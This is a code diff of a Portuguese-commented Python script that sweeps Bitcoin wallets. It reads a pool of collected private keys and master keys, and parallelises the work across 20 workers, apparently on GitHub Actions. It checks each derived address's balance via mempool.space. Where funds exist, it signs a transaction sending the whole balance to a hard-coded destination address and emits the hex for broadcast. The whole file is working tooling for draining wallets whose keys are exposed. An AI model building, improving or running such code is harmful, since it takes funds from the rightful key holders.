@@ -1,79 +1,127 @@
-import os, requests, time, sys
-from bitcoinlib.keys import Key
+import os
+import requests
+import time
+import sys
+import re
 
-# Configurações
+# Tenta importar a biblioteca Bitcoinlib com tratamento de erro
+try:
+    from bitcoinlib.keys import Key
+    from bitcoinlib.transactions import Transaction
+    print("✅ Bibliotecas Bitcoinlib carregadas.", flush=True)
+except ImportError:
+    print("❌ ERRO: bitcoinlib não instalada. Verifique o passo de Deps no Workflow.", flush=True)
+    sys.exit(1)
+
+# --- CONFIGURAÇÕES ---
 DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
 WORKER_ID = int(os.environ.get('WORKER_ID', 1))
 TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 20))
 
-def check_key(priv_key):
+def create_raw_tx(wif, balance_sats):
+    """Cria e assina uma transação para transferir o saldo total para o destino."""
     try:
-        priv_key = priv_key.strip()
-        if not priv_key: return
+        k = Key(wif, network='bitcoin')
+        # Taxa de mineração (sats). Agressiva para prioridade máxima.
+        fee = 4000 
+        amount = balance_sats - fee
         
-        # Suporte a Deep Scan (xprv)
-        if priv_key.startswith('xprv'):
-            master = Key(priv_key)
-            for i in range(20): # Amostra inicial de 20 endereços
-                check_key(master.subkey_for_path(f"0/{i}").wif())
+        if amount <= 546: # Dust limit
+            return None
+            
+        t = Transaction(network='bitcoin')
+        t.add_input(k.address(), balance_sats)
+        t.add_output(DEST_ADDRESS, amount)
+        t.sign(k)
+        return t.raw_hex()
+    except Exception as e:
+        print(f"❌ Erro ao assinar transação: {e}", flush=True)
+        return None
+
+def check_address(k, witness_type):
+    """Verifica o saldo de um endereço específico e gera o HEX se houver saldo."""
+    try:
+        addr = k.address(witness_type=witness_type)
+        # Log obrigatório para visibilidade no GitHub Actions
+        print(f"🔎 W{WORKER_ID} | {addr}", flush=True)
+        
+        # Consulta à API do Mempool.space
+        try:
+            r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10)
+            if r.status_code == 200:
+                data = r.json()
+                stats = data.get('chain_stats', {})
+                mempool = data.get('mempool_stats', {})
+                
+                # Cálculo de saldo (Confirmado + Pendente)
+                bal = (stats.get('funded_txo_sum', 0) + mempool.get('funded_txo_sum', 0)) - \
+                      (stats.get('spent_txo_sum', 0) + mempool.get('spent_txo_sum', 0))
+                
+                if bal > 1000: # Verifica se há saldo significativo (> 1000 sats)
+                    print(f"\n🚨 SALDO DETECTADO! {addr}: {bal} sats", flush=True)
+                    raw_hex = create_raw_tx(k.wif(), bal)
+                    if raw_hex:
+                        # A tag HEX_GEN: é capturada pelo run_worker.sh para broadcast
+                        print(f"HEX_GEN:{raw_hex}", flush=True)
+                    return True
+            elif r.status_code == 429:
+                print("⚠️ Rate Limit atingido. Aguardando 10s...", flush=True)
+                time.sleep(10)
+        except Exception:
+            pass # Ignora erros de conexão para manter o worker rodando
+            
+        # Delay suave para evitar bloqueio de IP (API pública)
+        time.sleep(0.15)
+    except:
+        pass
+    return False
+
+def process_key(priv_key_str):
+    """Processa uma string de chave, detectando se é WIF, HEX ou xprv (Deep Scan)."""
+    priv_key_str = priv_key_str.strip()
+    if not priv_key_str: return
+
+    try:
+        # --- LÓGICA DE DEEP SCAN (Master Keys xprv) ---
+        if priv_key_str.startswith('xprv'):
+            print(f"📦 W{WORKER_ID} | Iniciando Deep Scan em Master Key...", flush=True)
+            master = Key(priv_key_str)
+            # Varre os primeiros 50 endereços da derivação padrão
+            for i in range(50):
+                child_wif = master.subkey_for_path(f"0/{i}").wif()
+                process_key(child_wif)
             return
 
-        k = Key(priv_key, network='bitcoin')
-        # Testa os 3 formatos principais
-        formats = {
-            'Legacy (1...)': None,
-            'SegWit P2SH (3...)': 'p2sh-p2wpkh',
-            'Native SegWit (bc1...)': 'p2wpkh'
-        }
-
-        for label, w_type in formats.items():
-            addr = k.address(witness_type=w_type)
-            
-            # --- O PONTO CHAVE: PRINT COM FLUSH ---
-            # Isso faz o endereço aparecer no GitHub Actions na hora
-            print(f"🔎 W{WORKER_ID} | {label} | {addr}", flush=True)
-            
-            try:
-                # Consulta à API
-                r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10)
-                if r.status_code == 200:
-                    data = r.json()
-                    stats = data.get('chain_stats', {})
-                    mempool = data.get('mempool_stats', {})
-                    
-                    bal = (stats.get('funded_txo_sum', 0) + mempool.get('funded_txo_sum', 0)) - \
-                          (stats.get('spent_txo_sum', 0) + mempool.get('spent_txo_sum', 0))
-                    
-                    if bal > 0:
-                        print(f"\n🚨 [SALDO ENCONTRADO] 🚨", flush=True)
-                        print(f"💰 Endereço: {addr} | Saldo: {bal} sats", flush=True)
-                        print(f"🔑 Chave Privada: {priv_key}", flush=True)
-                        # O run_worker.sh capturará esta tag para broadcast
-                        print(f"HEX_GEN:{priv_key}", flush=True) 
-                
-                elif r.status_code == 429:
-                    print(f"⚠️ Rate Limit (Worker {WORKER_ID}). Aguardando 10s...", flush=True)
-                    time.sleep(10)
-            except Exception:
-                pass
-            
-            # Delay para respeitar a API pública
-            time.sleep(0.3)
-
-    except Exception as e:
-        pass
+        # --- VARREDURA DE CHAVES INDIVIDUAIS ---
+        k = Key(priv_key_str, network='bitcoin')
+        
+        # Testa os 3 formatos de endereço para cada chave privada
+        check_address(k, None)           # Legacy (1...)
+        check_address(k, 'p2sh-p2wpkh')  # SegWit Compat (3...)
+        check_address(k, 'p2wpkh')       # Native SegWit (bc1q...)
+        
+    except Exception:
+        pass # Ignora chaves com formato inválido no arquivo
 
 if __name__ == "__main__":
-    if os.path.exists('MASTER_POOL.txt'):
-        with open('MASTER_POOL.txt', 'r') as f:
+    print(f"--- INICIANDO WORKER {WORKER_ID} ---", flush=True)
+    
+    # Caminho do arquivo unificado gerado pelo prepare_pool.py
+    pool_file = 'MASTER_POOL.txt'
+    
+    if os.path.exists(pool_file):
+        with open(pool_file, 'r') as f:
+            # Filtra linhas vazias
             all_keys = [line.strip() for line in f if line.strip()]
         
+        # SHARDING: Divide a carga entre os 20 workers de forma exclusiva
         my_keys = [all_keys[i] for i in range(len(all_keys)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
         
-        print(f"🚀 ENGINE INICIADA | Worker {WORKER_ID} | Lote: {len(my_keys)} chaves", flush=True)
-        print("-" * 50, flush=True)
+        print(f"🚀 Worker {WORKER_ID} carregou {len(my_keys)} chaves únicas.", flush=True)
         
         for key in my_keys:
-            check_key(key)
+            process_key(key)
+            
+        print(f"✅ Worker {WORKER_ID} finalizou o lote.", flush=True)
     else:
-        print("❌ Erro: MASTER_POOL.txt não encontrado!", flush=True)
+        print(f"❌ ERRO: {pool_file} não encontrado!", flush=True)
